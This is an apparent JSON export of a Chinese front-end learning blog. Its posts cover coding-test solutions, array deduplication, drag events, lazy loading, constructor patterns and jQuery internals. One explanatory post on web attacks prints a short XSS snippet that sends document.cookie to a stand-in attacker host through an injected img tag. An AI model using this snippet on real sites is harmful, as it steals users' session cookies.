[{"title":"华为机试在线编程","date":"2017-03-25T14:09:13.000Z","path":"2017/03/25/华为机试在线编程/","text":"比较简单，将两个数翻转相加， 输出结果 1234567891011121314151617181920212223242526272829function reverseAdd(input) &#123; var input_array = input.split(','); var len = input_array.length; var numa = +input_array[0]; var numb = +input_array[1]; var reversea = '', reverseb = ''; if(numa&gt;=7000 || numa &lt; 1 || numb &gt;= 7000 || numb &lt; 1) &#123; console.log(-1); return; &#125; for(var j = input_array[0].length-1; j &gt;= 0; j--) &#123; reversea += input_array[0][j]; &#125; for(var k = input_array[1].length-1; k &gt;= 0; k--) &#123; reverseb += input_array[1][k]; &#125; numa = parseInt(reversea); numb = parseInt(reverseb); console.log(numa + numb); &#125; 骰子6面旋转的问题 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748function getResult(input) &#123; var input_array = input.split(''); var len = input_array.length; var strInit = '123456'; if( len&lt;=0 ) &#123; console.log(strInit); return; &#125; if( len&gt;50 ) &#123; return; &#125; for(var j = 0; j &lt; len; j++) &#123; var value = input_array[j]; var hash = getRol(strInit); strInit = hash[value]; &#125; console.log(strInit); &#125; function getRol(str) &#123; for(var i = 0; i &lt; 6; i++) &#123; strL = str[4]+str[5]+str[2]+str[3]+str[1]+str[0]; strR = str[5]+str[4]+str[2]+str[3]+str[0]+str[1]; strF = str[0]+str[1]+str[4]+str[5]+str[3]+str[2]; strB = str[0]+str[1]+str[5]+str[4]+str[2]+str[3]; strA = str[3]+str[2]+str[0]+str[1]+str[4]+str[5]; strC = str[2]+str[3]+str[1]+str[0]+str[4]+str[5]; &#125; return &#123; 'L': strL, 'R' :strR, 'F': strF, 'B':strB, 'A': strA, 'C':strC &#125; &#125; 考的是图的数据结构，java实现 import java.util.ArrayList;import java.util.List;import java.util.Scanner; public class Main { private static final int UNACCESS = 1000; private static Scanner in; static int[][] datas = { {0, 2, 10, 5, 3, UNACCESS}, {UNACCESS, 0, 12, UNACCESS, UNACCESS, 10}, {UNACCESS, UNACCESS, 0, UNACCESS, 7, UNACCESS}, {2, UNACCESS, UNACCESS, 0, 2, UNACCESS}, {4, UNACCESS, UNACCESS, 1, 0, UNACCESS}, {3, UNACCESS, 1, UNACCESS, 2, 0} }; private static List&lt;String&gt; pers = new ArrayList&lt;&gt;(); public static void main(String[] args) { in = new Scanner(System.in); while(in.hasNext()) { int start = 5; int X = in.nextInt(); int Y = in.nextInt(); if (Y != 0) { for (int j = 0; j &lt; datas.length; j++) { datas[Y - 1][j] = UNACCESS; datas[j][Y -1] = UNACCESS; } } int bestTime = Integer.MAX_VALUE; List&lt;Integer&gt; route = new ArrayList&lt;&gt;(); String s = &quot;12346&quot;; String result = &quot;&quot;; permutation(s, result, s.length()); String best_route = &quot;&quot;; for (int i = 0; i &lt; pers.size(); i++) { String per = &quot;5&quot; + pers.get(i); int temp_best = 0; for (int j = 0; j &lt; per.indexOf(&quot;&quot; + X); j++) { temp_best += datas[per.charAt(j) - &apos;0&apos; - 1][Integer.valueOf(per.charAt(j + 1)) - &apos;0&apos; - 1] ; } if ((bestTime &gt; temp_best)) { bestTime = temp_best; best_route = per; } } if (bestTime &lt; UNACCESS) { System.out.println(bestTime); for (int j = 0; j &lt; best_route.indexOf(&quot;&quot; + X) + 1; j++) { route.add(best_route.charAt(j) - &apos;0&apos;); } System.out.println(route); } else { System.out.println(UNACCESS); System.out.println(&quot;[]&quot;); } } } public static void permutation(String str, String result, int len) { if (result.length() == len) { pers.add(result); } else { for (int i = 0; i &lt; str.length(); i++) { if (result.indexOf(str.charAt(i)) &lt; 0) { permutation(str, result + str.charAt(i), len); } } } } }","tags":[{"name":"js 笔试","slug":"js-笔试","permalink":"https://muzicy.github.io/tags/js-笔试/"}]},{"title":"网易机试编程题前端js实现","date":"2017-03-25T13:57:33.000Z","path":"2017/03/25/网易机试编程题前端js实现/","text":"因为自己是学的js， 所以最后的编程题是用js实现，全部都通过所有实例,这次笔试最大的敌人就是js编程环境的输入输出问题 好像是一个集合的问题， 给一个p的上下范围, 一个q的上下范围，最后求集合的个数，涉及到去重的问题。 12345678910111213141516171819202122232425262728293031323334353637383940414243function getNum(input) &#123; var input_array = input.split(' '); var len = input_array.length; var ret = [], pArr = [], qArr = []; var hash = &#123;&#125;; var pRangeL = +input_array[0]; var pRangeH = +input_array[1]; var qRangeL = +input_array[2]; var qRangeH = +input_array[3]; if(pRangeL &gt; pRangeH || qRangeL &gt; qRangeH) &#123; console.log(0); return; &#125; for(var i = pRangeL; i &lt;= pRangeH; i++) &#123; pArr.push(i); &#125; for(var j = qRangeL; j &lt;= qRangeH; j++) &#123; qArr.push(j); &#125; for(i=0, len1 = pArr.length; i &lt; len1; i++) &#123; for(j = 0, len2 = qArr.length; j &lt; len2; j++) &#123; var num = pArr[i]/qArr[j]; if(!hash[num]) &#123; hash[num] = &#123;&#125;; hash[num].count = 1; ret.push(num); &#125; &#125; &#125; console.log(ret.length);&#125; 好像是说只有 + - * 三种运算， 没有优先级， 也就是按顺序求解最后给出答案，这一题比较简单 1234567891011121314151617181920212223242526272829303132function getRes(line) &#123; var input_array = line.trim().split(''); var len = input_array.length; var res = 0; while(input_array.length &gt; 1) &#123; var a = +input_array[0], b = +input_array[2], comp = input_array[1]; var num = comput(a, b, comp); input_array.splice(0, 3, num) &#125; console.log(+input_array[0]);&#125;function comput(a, b, comp) &#123; var num = 0; switch(comp) &#123; case '+': num = a+b; break; case '-':num = a-b; break; case '*': num = a*b; break; default: break; &#125; return num;&#125;var line = '3+5*7';getRes(line); 题目好像是如果数组中有重合的数， 就只保留最后一个出现的， 最后按顺序输出， 这一题可以从数组后面往前面判断， 再用hash表去重即可 1234567891011121314151617181920212223242526272829303132function getUnique(input) &#123; var input_array = input.split('\\n'); var num = input_array[0]; var hash = &#123;&#125;; var ret = []; if(num &lt; 1 || num &gt; 50) &#123; return; &#125; var testArr = input_array[1].split(' '); var len = testArr.length; for(var i = 0; i &lt; len; i++) &#123; testArr[i] = +testArr[i]; if(testArr[i] &gt; 1000 || testArr[i] &lt; 1) &#123; return; &#125; &#125; for(i = len-1; i &gt;= 0; i--) &#123; if(!hash[testArr[i]]) &#123; hash[testArr[i]] = &#123;&#125;; hash[testArr[i]].count = 1; ret.push(testArr[i]); &#125; &#125; ret = ret.reverse().join(' '); console.log(ret);","tags":[{"name":"笔试真题","slug":"笔试真题","permalink":"https://muzicy.github.io/tags/笔试真题/"}]},{"title":"Web的攻击技术","date":"2017-03-23T06:20:46.000Z","path":"2017/03/23/Web的攻击技术/","text":"Web应用的攻击模式： 主动攻击 2. 被动攻击 1.以服务器为目标的主动攻击： 主动攻击是指攻击者通过直接访问Web应用， 把攻击代码传入的攻击模式 ， 主动攻击模式最具有代表性的攻击是 SQL注入攻击和OS命令注入攻击 1.SQL注入攻击: 是指针对WebYin应用使用的数据库，通过运行非法的SQL而产生的攻击。 2 OS命令注入攻击是只通过Web应用，执行非法的操作系统命令达到攻击的目的 2.以服务器为目标的被动攻击： 被动攻击是指利用全套策略执行代码的攻击模式。被动攻击过程中，攻击者不直接对目标Web英语访问发起攻击。 被动攻击的攻击模式如下：1。 攻击者诱使用户点击已经设置好的陷阱， 而陷阱会启动发送已嵌入攻击代码的http请求。 2. 当用户不知不觉中招后，用户的浏览器或邮件客户端就会触发这个陷阱。 3. 中招后的用户浏览器会把含有攻击代码的HTTP请求发送给作为攻击目标的Web应用， 运行攻击代码。 4.执行完攻击代码，存在安全漏洞的Web应用汇称为攻击者的调班， 可能导致用户所持的Cookie等个人信息被窃取， 登录状态中的用户权限遭恶意滥用等后果， 典型的攻击模式中具有代表性的攻击是跨站脚本攻击（XSS） 和 跨站点请求伪造（CSRF）; 2.1 跨站脚本攻击（XSS)： 定义：是指在存有安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或者Javascript进行的一种攻击。 动态创建的脚本可能隐藏着安全漏洞。 跨站脚本攻击可能造成的影响: 1. 利用虚假输入表单骗取用户个人信息 2. 利用脚本窃取用户的Cookie值， 被害者在不知情的情况下帮助攻击者发送恶意请求 3. 显示伪造的文章或者图片 跨站脚本攻击的案例： 在表单中设入的圈套： 1、在输入用户信息的时候，可能输入含有恶意的HTML标签， 动态生成HTML处发生 2.某些网站通过URL中的查询字段来指定表单用户的ID, 攻击者在这个URL后面嵌入恶意代码的URL,这段URL包含脚本， 那么在浏览器打开该URL后， 设置好的脚本会运行，将用户输入的认证信息发送到攻击者网站 对用户Cookie信息的获取: 在脚本内嵌入指定的xss.js 文件 该文件定义如下: 1234var content = escape(document.cookie);document.write('&lt;img src = http://hackr.js/?&gt;');document.write(content);document.write('&gt;'); 在存在可跨站脚本攻击安全漏洞的Web应用上执行上面这段js代码， 即可访问该域名下的Cookie信息， 然后将这些信息发送至攻击者的Web网站， 记录在它的登陆日志中 2.2 HTTP首部注入攻击 是指攻击者通过响应首部字段内插入换行，添加任意响应首部或者主体的一种攻击模式，可能造成的影响: 设置任意的Cookie信息， 重定向至任意的URL, 显示任意的主体（向首部主体内添加内容– HTTP响应式截断效应） 2.3 跨站点请求伪造攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或车顶信息等某些状态的更新。","tags":[{"name":"web  攻击","slug":"web-攻击","permalink":"https://muzicy.github.io/tags/web-攻击/"}]},{"title":"关于数组去重的几种方法","date":"2017-03-22T12:14:06.000Z","path":"2017/03/22/关于数组去重的几种方法/","text":"数组去重应该算是前端开发最常考的算法题目， 但是有一点需要注意，在js中数组不只包含纯数字，因此在考虑去重的方法时要很仔细，下面列举了字符串去重的几种方法实现及其具有的局限性说明 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt; 消除数组重复元素&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt;var array = [1, 2, 3, '3', 4, '4', 5, 5, 6, 1, 9, 3, 25,1, 2, 3, '3', 4, '4', 5, 6];//这一段代码只有针对于纯数字元素数组管用，因为对象会将所有属性转化为字符串存贮。function deRepeat(arr) &#123; var newArr = []; var obj = &#123;&#125;; var index = 0; var l = arr.length; for (var i = 0; i &lt; l; i++) &#123; if (obj[arr[i]] == undefined) &#123; obj[arr[i]] = 1; newArr[index++] = arr[i]; &#125; else if (obj[arr[i]] == 1) continue; &#125; return newArr; &#125; //使用于参数混合数字与字符串的情况,可以看到时间复杂度是o(n^2) ; function unique1 (arr) &#123; var start = +new Date(); var res = [arr[0]]; for(var i = 1, len = arr.length; i &lt; len; i++) &#123; var repeat = false; for(var j = 0, len2 = res.length; j &lt; len2; j++) &#123; if(res[j] === arr[i]) &#123; repeat = true; break; &#125; &#125; if(!repeat) &#123; res.push(arr[i]); &#125; &#125; var end = +new Date(); console.log(end-start); return res;&#125; //console.log(arr.unique1());//同第一种方法 function unique2 (arr) &#123; var res = []; for (var i = 0, len = arr.length; i &lt; len; i++) &#123; if(res.indexOf(arr[i]) === -1) &#123; res.push(arr[i]); &#125; &#125; return res;&#125;console.log(arr.unique2()); //第三种方法是先将数组排序，再插入，时间复杂度O(n),会改变原数组的排序顺序,这种方法有问题，sort排序的问题，会将['3',3,3,'3']这样排序，那就不能以这样的判断方式了；function unique3(arr)&#123; arr.sort(); //先排序 var res = [arr[0]]; for(var i = 1; i &lt; arr.length; i++)&#123; if(arr[i] !== res[res.length - 1])&#123; res.push(arr[i]); &#125; &#125; return res;&#125; // console.log(arr.unique3()) //var newArr2 = getArray(arr); //alert(newArr2); //输出1,2,3,4,5,6,9,25//跟第一种方法一样，不能分别字符串和数字function unique4(arr)&#123; var res = []; var json = &#123;&#125;; for(var i = 0; i &lt; arr.length; i++)&#123; if(!json[arr[i]])&#123; res.push(arr[i]); json[arr[i]] = 1; &#125; &#125; return res;&#125; // 这个方法就是为所有的字符串类型添加一个前缀，为了避免与其他转化成字符串后相等的属性重复且覆盖 Array.prototype.unique5 = function(arr) &#123; var uq = &#123;&#125;; var rq = []; var prefix = ''; for(var i=0; i&lt;8; i++)&#123; if(typeof arr[i] == 'string' ) &#123; pre = '_str'; &#125; else &#123; pre = ''; &#125; if(!uq[arr[i]+pre])&#123; uq[arr[i]+prefix] = true; rq.push(arr[i]); &#125; &#125; return rq; &#125; //最后一种，直接利用es6的Set数据结构实现,但是在运行时，需要首先配置es6转es5的转码器 function unique(arr) &#123; return new Set(arr); &#125;//alert(arr1.unique4()); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","tags":[{"name":"js 算法","slug":"js-算法","permalink":"https://muzicy.github.io/tags/js-算法/"}]},{"title":"关于鼠标拖拽的问题","date":"2017-03-21T13:19:09.000Z","path":"2017/03/21/关于鼠标拖拽的问题/","text":"之前鼠标拖拽实现一个div随鼠标移动，用的是原生js, 为target绑定onmousedown 和 onmousemove onmouseup的事件代码如下1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283 &lt;!DOCTYPE html &gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt;&lt;title&gt;ÎÞ±êÌâÎÄµµ&lt;/title&gt;&lt;style&gt;.div2 &#123; position: relative; width: 600px; height: 500px; border: 1px solid black; left:200px; top: 100px;&#125; #div1 &#123;width:200px;height:200px;background:red;position:absolute;&#125;&lt;/style&gt;&lt;script&gt; window.onload=function() &#123; var oCont = document.getElementsByClassName('div2')[0]; var oDiv=document.getElementById(\"div1\"); var disX=0 var disY=0; oDiv.onmousedown=function(ev) &#123; var oEvent=ev||event; disX=ev.clientX-oDiv.offsetLeft; disY=ev.clientY-oDiv.offsetTop; oCont.onmousemove=function(ev) &#123; var oEvent=ev||event; var l=oEvent.clientX-disX; var t=oEvent.clientY-disY; //碰撞检测 if (l&lt;0) &#123; l=0; &#125; else if (l&gt;(oCont.clientWidth-oDiv.offsetWidth)) &#123; l=(oCont.clientWidth-oDiv.offsetWidth); &#125; if (t&lt;0) &#123; t=0; &#125; else if (t&gt;(oCont.clientHeight-oDiv.offsetHeight)) &#123; t=(oCont.clientHeigh-oDiv.offsetHeight); &#125; oDiv.style.left=l+'px'; oDiv.style.top=t+'px'; &#125; document.onmouseup=function() &#123; oCont.onmousemove = null; oDiv.onmouseup = null; &#125; &#125; return false; &#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class='div2'&gt;&lt;div id=\"div1\"&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 这一段代码可以很好的运行。 现在从头来实现的实现就想能不能用addEventListener事件来实现，具体代码和疑问记录如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;实现一个页面对某个节点的拖拽&lt;/title&gt;&lt;/head&gt;&lt;style type=\"text/css\"&gt;* &#123; margin: 0; padding: 0;&#125;.container &#123; position: relative; width: 600px; height: 600px; border:1px solid black; margin: 100px auto;&#125;.dragable &#123; position: absolute; left: 0; top: 0; width:50px; height:50px; background-color: #f00;&#125;&lt;/style&gt;&lt;body&gt;&lt;div class='container'&gt; &lt;div class='dragable'&gt;拖拽我&lt;/div&gt;&lt;/div&gt;&lt;script type=\"text/javascript\"&gt; var oDrag = document.getElementsByClassName('dragable')[0]; var oCont = document.getElementsByClassName('container')[0]; if(oDrag.addEventListener) &#123; var disX = 0, disY = 0; oDrag.addEventListener('mousedown', function(e) &#123; var event = e || window.event; disX = event.clientX - oDrag.offsetLeft; disY = event.clientY - oDrag.offsetTop; this.style.backgroundColor = 'green'; var handler = function (ev) &#123; //console.log(event + '--'); console.log(ev); var event1 = ev || window.event; var left = event1.clientX - disX; //console.log(event1.clientX) var top = event1.clientY - disY; var res = detactConflict(left, top); oDrag.style.left = res.l + 'px'; oDrag.style.top = res.t + 'px'; &#125; //因为一直在考虑通过addEventListener添加的事件只能通过removeEventListener事件来移动，且传递的函数要是同一个，因此就不能使用匿名函数，但是，因为需要获取鼠标所在的位置，那么就需要传递event事件给函数， 但是矛盾就是在addEventListener里的第二个参数如果直接传handler(event)的话就是直接在这里调用函数了，addEventListener函数就只掉用一次就不能持续完成当监听到事件时调用函数参数， 最好的方法就是将函数封装在匿名函数里面通过传递参数的方式达到目的，那么矛盾就来了，如何去移除添加的事件呢，因为是匿名函数，没有提供handler? attachEvent也是同样的问题。 oCont.addEventListener('mousemove',function(e) &#123;handler(e)&#125; , false); /* oDrag.addEventListener('mouseup', function() &#123; document.removeEventListener('mousemove', handler, false); &#125;,false); /* function handlermouseup() &#123; oDrag.style.backgroundColor = 'red'; oCont.removeEventListener('mousemove', handlermove); oDrag.removeEventListener('mouseup', handlermouseup); &#125; */ &#125;) &#125; else if (oDrag.attachEvent) &#123; oDrag.attachEvent('onmousedown', function(e) &#123; var event = e || window.event; disX = event.clientX - oDrag.offsetLeft; disY = event.clientY - oDrag.offsetTop; this.style.backgroundColor = 'green'; &#125;); oDrag.attachEvent('onmousemove', function(e) &#123; var event = e || window.event; var left = event.clientX - disX; var top = event.clientY - disY; var res = detactConflict(left, top); oDrag.style.left = res.l + 'px'; oDrag.style.top = res.t + 'px'; &#125;); oDrag.attachEvent('onmouseup', function(e) &#123; this.detachEvent('onmousdown', function()&#123; this.detachEvent('onmousemove', function() &#123; this.style.backgroundColor = 'red'; &#125;) &#125;); &#125;) &#125; else &#123; var disX = 0, disY = 0; oDrag.onmousedown=function(ev) &#123; var oEvent=ev||window.event; disX=ev.clientX-oDrag.offsetLeft; disY=ev.clientY-oDrag.offsetTop; oCont.onmousemove=function(ev) &#123; var oEvent=ev||event; var l=oEvent.clientX-disX; var t=oEvent.clientY-disY; var res = detactConflict(l ,t); oDrag.style.left=res.l+'px'; oDrag.style.top=res.t+'px'; &#125; oCont.onmouseup=function() &#123; oCont.onmousemove=null; oDrag.onmouseup=null; &#125; &#125; &#125; function detactConflict(l, t) &#123; if(l &gt; (oCont.clientWidth-oDrag.offsetWidth)) &#123; l = oCont.clientWidth-oDrag.offsetWidth; &#125; else if( l &lt; 0 ) &#123; l = 0; &#125; else if ( t &gt; (oCont.clientHeight - oDrag.offsetHeight)) &#123; t = oCont.clientHeight - oDrag.offsetHeight; &#125; else if ( t &lt; 0) &#123; t = 0; &#125; return &#123; l:l, t:t &#125; &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 最好的办法就是自己重新封装一下addEventListener和attachEvent事件。方法转载见博客JS添加/绑定事件监听函数并传参数attachEvent和addEventListener兼容个浏览器addEventHandler[http://blog.sina.com.cn/s/blog_75ad10100101gzxd.html]:代码如下：12345678910111213141516171819202122232425262728293031function addEventHandler(obj,eventName,fun,param='')&#123; var fn = fun; if(param) &#123; fn = function(e) &#123; fun.call(this, param); //继承监听函数,并传入参数以初始化; &#125; &#125; if (obj.addEventListener)&#123; obj.addEventListener(eventName,fn,false); &#125; else if(obj.attachEvent)&#123; obj.attachEvent('on'+eventName,fn); &#125; else&#123; obj[\"on\" + eventName] = fn; &#125;&#125; * * 删除事件监听函数 * obj 要添加监听的对象或元素 * eventName 事件名 * fun 监听函数的名称 *function removeEventHandler(obj, eventName, fun) &#123; if (obj.removeEventListener) obj.removeEventListener(eventName, fun, false); else if (obj.detachEvent) obj.detachEvent(\"on\" + eventName, fun); else delete obj[\"on\" + eventName];&#125;","tags":[{"name":"js, dom","slug":"js-dom","permalink":"https://muzicy.github.io/tags/js-dom/"}]},{"title":"图片懒加载技术","date":"2017-03-20T14:21:22.000Z","path":"2017/03/20/图片懒加载技术/","text":"什么是图片懒加载技术:利用鼠标的滚轮事件，当图片很多时，只有当图片在视口区域时才加载图片，通过设置img的src属性 图片懒加载技术的好处主要有两点:a. 当页面中的图片很多时， 如果一次加载全部图片，那么页面加载完肯定很慢，用户填肯定不好。 b. 如果一次性像服务器请求几百张上千张图片，需要发送这么多个http请求，服务器可能吃不消。 原生js实现首先函数判断当前img是否出现在视口区， 通过判断当前的图片在页面中的位置可以确定，具体代码如下： 123456789101112131415161718192021222324252627 window.onscroll=function() &#123; var viewClient = document.documentElement.clientHeight + (document.documentElement.scrollTop || document.body.scrollTop); var imgHeight = getImgHeight(oImg) if (imgHeight &lt; viewClient) &#123; setTimeout( 'showImg', 500); &#125; &#125;&#125;function getImageHeight(elem) &#123; var hei = elem.offsetTop; var current = elem.offsetParent; while( current !== null) &#123; hei += current.offsetTop; current = current.offsetParent; &#125; return hei;&#125;//为了显示首屏图片window.onload = function() &#123; window.oncroll();&#125;","tags":[{"name":"js","slug":"js","permalink":"https://muzicy.github.io/tags/js/"}]},{"title":"js构造函数","date":"2017-03-17T06:26:40.000Z","path":"2017/03/17/js构造函数/","text":"js构造函数有很多种，记录如下: 对象字面量创建对象,有点简单明了， 用来创建单个对象很好，但是如果一个接口创建很多对象，会产生大量重复的代码； 1234567var peroson = &#123; name: &apos;muzicy&apos;, job: &apos;student&apos;, sayname: function() &#123; alert(this.name); &#125;&#125; 利用Object创建对象,其优缺点同对象字面量法创建对象 1234567var person = new Object();person.name='muzicy';person.job = 'student',person.sayName = function() &#123; alert(this.name);&#125; 工厂模式这种模式抽象了创建具体对象的过程，用函数来封装以特定接口创建对象的细节。 123456789101112131415function createPerson(name, job) &#123; var o = new Object(); o.name = name; o.job = job; o.sayName = function() &#123; alert(this.name); &#125; return o;&#125;//创建对象var person1 = createPerson('muzicy','student');var person2 = createPerson('lkl', 'teacher'); 工厂模式的好处在于，可以多次的调用createPerson这个函数创建多个对象，可以灵活的通过赋值解决了多个相似对象的问题， 缺点在于没有解决对象识别的问题，就是不知道这个对象的类型是什么。 4.构造函数模式: Object和Array就是原生的构造函数，在运行时会自动出现在执行环境中， 此外，我们也可以创建自定义构造函数， 从而自定义对象类型的属性和方法。12345678910function Person(name, job) &#123; this.name = name; this.job = job; this.sayName = function() &#123; alert(this.name); &#125;;&#125;var person1 = new Person('mizicy', 'student');var person2 = new Person('lkl', 'teacher'); 构造函数模式与工厂模式相比可以看到不同之处在于：1、没有在函数内部显示的创建对象 2.直接将属性和方法赋值给了this对象。3.没有return 返回对象。 在创建对象时， 通过new 操作符新建对象。 那么这里的new做了哪些事情：1.首先会创建一个对象。 2 将构造函数的作用域赋给新对象， 即this指向这个新对象 给这个对象添加属性和方法。 4. 返回新对象。对于上面创建的构造函数的实例person1和person2， 这两个对象均有一个constructor属性指向Person;1234567person1.constructor === Person; //trueperson2.constructor === Person; //true//由于我们所有创建的对象也都是Object的实例，因此可以用 instanceof 来检测对象的属性person1 instanceof Object //trueperson2 instanceof Object //trueperson1 instanceof Person //trueperson2 instanceof Person //true; 构造函数同其他函数的唯一区别在于调用它们的方式不一样， 任何函数只要通过new 构造就可以作为构造函数。如果不使用new来调用Person，则所有属性和方法都会添加至window对象，可以通过Person.call(),Person.apply来改变作用域对象1234567891011var person1 = new Person('muzicy', 'student');person1.sayName(); //muzicy;//当作普通函数使用Person('muzicy','student');window.sayName();//在另一个对象的作用域调用var o = new Obejct();Person.call(o, 'muzicy', 'student');o.sayName(); 构造函数模式当然也存在问题， 我们可以看到每创建一个实例， 就会重新创建sayName()方法， 这样就存在代码没有复用的问题。 5.原型模式 我们所创建的每个函数都含有一个prototype属性，这一属性是一个指针，指向原型对象。 原型对象包含着特定类型的所有实例可以共享的属性和方法。也就是说使用原型对象可以让所有的实例共享属性和方法。 123456789101112131415161718function Person () &#123;&#125;Person.prototype.name = 'muzicy';Person.prototype.job = 'student';Person.prototye.sayName = function() &#123; alert(this.name);&#125;var person1 = new Person();person1.sayName();var person2 = new Person();person2.sayName();alert(person1.sayName == person2.sayName) //true 我们虽然可以通过对象实例访问保存在原型中的值，但是却不能通过对象实例重写原型中值， 如果我们在实例中添加了一个属性，且该属性与原型中的属性同名，那么这个属性是属于实例的，会屏蔽原型中的那个属性，可以通过delete属性删除实例中的属性， 可以用hasOwnProperty方法来检测属性是否存在于实例中。in操作符会在检测到属性时返回true,不管该属性是存在于实例中还是原型对象中。检测属性是否在原型对象中用hasPrototypeProperty()方法来检测。 for-in 返回能通过对象访问的，可枚举的属性， 包括实例和原型中。 原型对象的问题： 原型模式虽然省略了为构造函数传递初始化参数这一环节，结果是所有的实例在默认情况系会取得相同的属性值。除此之外，最大的问题在于其共享的本性所导致，当在某一实例中修改引用类型的对象的属性时，那么其他实例对象的该引用属性也会发生变化。 6.组合使用构造函数模式和原型模式123456789function Person(name, age) &#123; this.name = name; this.age = age; this.friends = ['marry', 'jone'];&#125;Person.protptype.sayName = function() &#123; console.log(this.name);&#125; 所有的实例属性都是在构造函数中定义的，所有的实例共享的属性的方法都是在原型中定义的。 该方法是目前用来创建自定义类型的方法。 动态原型模式动态原型模式致力于解决独立的构造函数和原型， 它将所有信息都封装在构造函数中，通过检测某种方法是否已经存在， 再来确定是否需要初始化原型 12345678910function Person(name, job) &#123; this.name = name; this.jon = job; if(typeof this.sayName != 'function') &#123; Person.prototype.sayName = function() &#123; console.log(this.name); &#125; &#125;&#125; 构造寄生函数模式 稳妥构造函数模式","tags":[{"name":"js","slug":"js","permalink":"https://muzicy.github.io/tags/js/"}]},{"title":"JQuery源码中extend方法了解","date":"2017-03-16T01:49:09.000Z","path":"2017/03/16/JQuery源码中extend方法了解/","text":"jQuery.extend(obj)是为扩展Jquery类本身而添加的方法，可以理解为静态方法, jQuery.fn.extend(obj)因为jQuery.fn = jQuery.prototype 因此可以看到是为jQuery类添加成员函数， jQuery类的实例可以共享这个方法。jQuery.extend() 的调用并不会把方法扩展到对象的实例上，引用它的方法也需要通过jQuery类来实现，如jQuery.ajax()，而 jQuery.fn.extend()的调用把方法扩展到了对象的prototype上，所以实例化一个jQuery对象的时候，它就具有了这些方法. jQuery.extend( target, object1, [objectN]) 返回被扩展的对象jQuery.fn.extend(object); 源码如下： 代码中可以看到jQuery.extend = jQuery.fn.extend 这两者共享同一个方法。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869jQuery.extend = jQuery.fn.extend = function() &#123; var options, name, src, copy, copyIsArray, clone, // target是指被扩展的对象 target = arguments[ 0 ] || &#123;&#125;, i = 1, length = arguments.length, deep = false; // Handle a deep copy situation if ( typeof target === \"boolean\" ) &#123; deep = target; // Skip the boolean and the target target = arguments[ i ] || &#123;&#125;; i++; &#125; // Handle case when target is a string or something (possible in deep copy) if ( typeof target !== \"object\" &amp;&amp; !jQuery.isFunction( target ) ) &#123; target = &#123;&#125;; &#125; // Extend jQuery itself if only one argument is passed if ( i === length ) &#123; target = this; i--; &#125; // for ( ; i &lt; length; i++ ) &#123; // Only deal with non-null/undefined values if ( ( options = arguments[ i ] ) != null ) &#123; // Extend the base object for ( name in options ) &#123; src = target[ name ]; copy = options[ name ]; // Prevent never-ending loop if ( target === copy ) &#123; continue; &#125; // Recurse if we're merging plain objects or arrays if ( deep &amp;&amp; copy &amp;&amp; ( jQuery.isPlainObject( copy ) || ( copyIsArray = jQuery.isArray( copy ) ) ) ) &#123; if ( copyIsArray ) &#123; copyIsArray = false; clone = src &amp;&amp; jQuery.isArray( src ) ? src : []; &#125; else &#123; clone = src &amp;&amp; jQuery.isPlainObject( src ) ? src : &#123;&#125;; &#125; // Never move original objects, clone them target[ name ] = jQuery.extend( deep, clone, copy ); // Don't bring in undefined values &#125; else if ( copy !== undefined ) &#123; target[ name ] = copy; &#125; &#125; &#125; &#125; // Return the modified object return target;&#125;; 假设现在要编写一个插件12345678$.fn.extend(&#123; alertWhileClick:function() &#123; $(this).click(function()&#123; alert($(this).val()); &#125;); &#125; &#125;); $(\"#obtn\").alertWhileClick(); 从上面的代码可以看到，这个插件方法是扩展到Juqery类中的原型中的方法， 因此被Jquery的实例所共享。或者在Jquery对象上扩展方法，如图$.ajax()方法一样是可以直接由这个对象所调用12345678$.extend(&#123; alertWhileClick:function() &#123; $(this).click(function()&#123; alert($(this).val()); &#125;); &#125; &#125;); $.alertWhileClick();","tags":[{"name":"Jquery","slug":"Jquery","permalink":"https://muzicy.github.io/tags/Jquery/"}]},{"title":"JQuery源码构造Jquery对象","date":"2017-03-16T01:08:31.000Z","path":"2017/03/16/JQuery源码构造Jquery对象/","text":"整个jquery源码是一个立即执行函数,并传递两个参数进去， 一个是全局对象window， 另外一个是工厂模式的函数。因为在传递的函数内部最后 return JQuery对象， 因此说它是工厂模式的函数123456789101112131415161718192021222324252627( function( global, factory ) &#123; \"use strict\"; if ( typeof module === \"object\" &amp;&amp; typeof module.exports === \"object\" ) &#123; // For CommonJS and CommonJS-like environments where a proper `window` // is present, execute the factory and get jQuery. // For environments that do not have a `window` with a `document` // (such as Node.js), expose a factory as module.exports. // This accentuates the need for the creation of a real `window`. // e.g. var jQuery = require(\"jquery\")(window); // See ticket #14549 for more info. module.exports = global.document ? factory( global, true ) : function( w ) &#123; if ( !w.document ) &#123; throw new Error( \"jQuery requires a window with a document\" ); &#125; return factory( w ); &#125;; &#125; else &#123; factory( global ); &#125;// Pass this if window is not defined yet&#125; )( typeof window !== \"undefined\" ? window : this, function( window, noGlobal )&#123;&#125; 2 为什么我们在构造jquery对象时不需要加new. 我们获取一个对象是通过 $(‘#obtn’) 而不是new $(‘#obtn’);这是因为在Jquery构造函数的内部本身就返回的是一个new 的对象123456jQuery = function( selector, context ) &#123; // The jQuery object is actually just the init constructor 'enhanced' // Need init if jQuery is called (just allow error to be thrown if not included) return new jQuery.fn.init( selector, context ); &#125; 有疑问，这个Jquery.fn.init是个什么鬼， 